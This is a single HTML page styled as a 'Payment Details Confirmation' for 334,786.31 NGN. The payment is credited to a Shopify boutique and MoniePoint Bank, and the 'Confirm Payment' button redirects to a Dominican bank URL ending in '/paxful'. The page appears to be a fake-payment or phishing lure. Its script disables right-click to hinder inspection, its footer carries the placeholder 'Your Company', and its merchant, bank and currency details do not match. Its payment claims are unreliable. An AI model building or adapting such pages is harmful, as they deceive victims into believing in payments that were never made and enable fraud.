<!DOCTYPE html>
<html>
  <head>
    <title>Payment Confirmation</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <style>
      /* Base Styling */
      body {
        font-family: "Inter", Arial, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #f4f6f9;
        color: #2d3748;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }

      .container {
        background: white;
        border-radius: 12px;
        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
        padding: 30px;
        max-width: 600px;
        width: 100%;
        text-align: center;
      }

      h1 {
        color: #1a202c;
        font-size: 28px;
        margin-bottom: 20px;
        font-weight: 700;
      }

      p {
        color: #4a5568;
        font-size: 16px;
        line-height: 1.6;
        margin: 10px 0;
      }

      .highlight {
        font-weight: 600;
        color: #2b6cb0;
        font-size: 20px;
      }

      .confirm-button {
        background-color: #2b6cb0;
        border: none;
        color: white;
        padding: 16px 20px;
        font-size: 18px;
        font-weight: 600;
        border-radius: 8px;
        cursor: pointer;
        transition: transform 0.2s ease, background-color 0.3s ease;
        width: 100%;
        box-sizing: border-box;
        text-transform: uppercase;
      }

      .confirm-button:hover {
        background-color: #2c5282;
        transform: translateY(-2px);
      }

      .confirm-button:active {
        transform: translateY(1px);
      }

      .details {
        background: #f7fafc;
        padding: 20px;
        border-radius: 8px;
        margin-top: 20px;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
        text-align: left;
      }

      .details p {
        margin: 8px 0;
        font-size: 16px;
      }

      .details .label {
        font-weight: 600;
        color: #2d3748;
        font-size: 14px;
        margin-top: 10px;
      }

      footer {
        margin-top: 20px;
        font-size: 14px;
        color: #a0aec0;
      }

      footer strong {
        color: #2d3748;
      }

      @media (max-width: 768px) {
        h1 {
          font-size: 24px;
        }

        p {
          font-size: 14px;
        }

        .confirm-button {
          font-size: 16px;
          padding: 14px;
        }

        .details p {
          font-size: 14px;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>Payment Details Confirmation</h1>
      <p>
        Please review your payment details below. Confirm only if you are sure
        of authorizing this transaction.
      </p>

      <div class="details">
        <p class="label">Payment Method:</p>
        <p>Shopify-Ennies Collection Boutique</p>
        <p>MoniePoint Bank</p>

        <p class="label">Amount:</p>
        <p class="highlight">334,786.31 NGN</p>
      </div>

      <button class="confirm-button" onclick="confirmPayment()">
        Confirm Payment
      </button>
      <footer>
        <p>Secured by <strong>Your Company</strong>. All rights reserved.</p>
      </footer>
    </div>

    <script>
      // Disable right-click
      document
        .getElementsByTagName("html")[0]
        .setAttribute("oncontextmenu", "return false");

      // Redirect on confirmation
      function confirmPayment() {
        window.location.href = "https://www.bancodominicanobhd.com/paxful";
      }
    </script>
  </body>
</html>
